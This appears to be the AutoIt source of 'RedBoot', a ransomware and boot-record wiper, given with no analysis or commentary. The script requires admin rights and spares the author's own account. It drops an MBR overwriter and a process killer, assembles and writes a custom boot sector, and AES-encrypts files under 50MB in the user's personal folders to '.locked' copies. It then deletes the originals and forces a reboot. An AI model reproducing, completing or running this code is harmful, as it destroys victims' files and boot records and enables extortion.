#NoTrayIcon
#RequireAdmin
#Region
#AutoIt3Wrapper_Outfile=RedBoot.exe
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=y
#AutoIt3Wrapper_Res_Comment=None
#AutoIt3Wrapper_Res_Description=None
#AutoIt3Wrapper_Res_Fileversion=1.0.0.0
#AutoIt3Wrapper_Res_LegalCopyright=None
#AutoIt3Wrapper_Res_Language=1033
#EndRegion

; --- includes AutoIt (Array/File/Crypt) omitted; full in RedBoot.au3 ---

If @UserName == "Kitty" Then
	Exit
EndIf
$RNAME = Random ( 10000000 , 99999999 , 1 )
$WD = @HomeDrive & @HomePath & "\" & $RNAME
DirCreate ( $WD )
$ENCKEY = StringReplace ( _CRYPT_HASHDATA ( @UserName , $CALG_SHA1 ) , "0x" , "" )
$IDKEY = StringReplace ( _CRYPT_HASHDATA ( $ENCKEY , $CALG_SHA1 ) , "0x" , "" )
FileInstall ( "C:\Users\Kitty\Desktop\shared2\mbrover.exe" , $WD & "\overwrite.exe" )
FileInstall ( "C:\Users\Kitty\Desktop\assembler.exe" , $WD & "\assembler.exe" )
FileInstall ( "C:\Users\Kitty\Desktop\mbrover\mbr.asm" , $WD & "\boot.asm" )
FileInstall ( "C:\Users\Kitty\Desktop\Myriad\Concept Testing\TMkill.exe" , $WD & "\protect.exe" )
Run ( """" & $WD & "\protect.exe""" )
FileMove ( @ScriptFullPath , $WD & "\main.exe" )
_REPLACESTRINGINFILE ( $WD & "\boot.asm" , "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" , $IDKEY )
RunWait ( """" & $WD & "\assembler.exe"" -f bin """ & $WD & "\boot.asm"" -o """ & $WD & "\boot.bin""" )
FileDelete ( $WD & "\boot.asm" )
FileDelete ( $WD & "\assembler.exe" )
BOOTOVERRIDE ( )
ENCRYPTDIRECTORY ( @HomeDrive & @HomePath & "\Desktop" , $ENCKEY )
ENCRYPTDIRECTORY ( @HomeDrive & @HomePath & "\Documents" , $ENCKEY )
ENCRYPTDIRECTORY ( @HomeDrive & @HomePath & "\Downloads" , $ENCKEY )
ENCRYPTDIRECTORY ( @HomeDrive & @HomePath & "\Pictures" , $ENCKEY )
ENCRYPTDIRECTORY ( @HomeDrive & @HomePath & "\Videos" , $ENCKEY )
ENCRYPTDIRECTORY ( @HomeDrive & @HomePath & "\Music" , $ENCKEY )
Shutdown ( $SD_REBOOT )
Func BOOTOVERRIDE ( )
	RunWait ( """" & $WD & "\overwrite.exe"" """ & $WD & "\boot.bin""" )
EndFunc
Func ENCRYPTDIRECTORY ( $DIR , $KEY )
	If FileExists ( $DIR ) Then
		$DIR2ENC = $DIR
		$A_FILES = _FILELISTTOARRAYREC ( $DIR2ENC , "*" , $FLTAR_FILES , $FLTAR_RECUR , $FLTAR_NOSORT )
		For $I = 1 To $A_FILES [ 0 ]
			If FileGetSize ( $DIR2ENC & "\" & $A_FILES [ $I ] ) < 52428800 Then
				_CRYPT_ENCRYPTFILE ( $DIR2ENC & "\" & $A_FILES [ $I ] , $DIR2ENC & "\" & $A_FILES [ $I ] & ".locked" , $KEY , $CALG_AES_256 )
				FileDelete ( $DIR2ENC & "\" & $A_FILES [ $I ] )
			EndIf
		Next
	EndIf
EndFunc
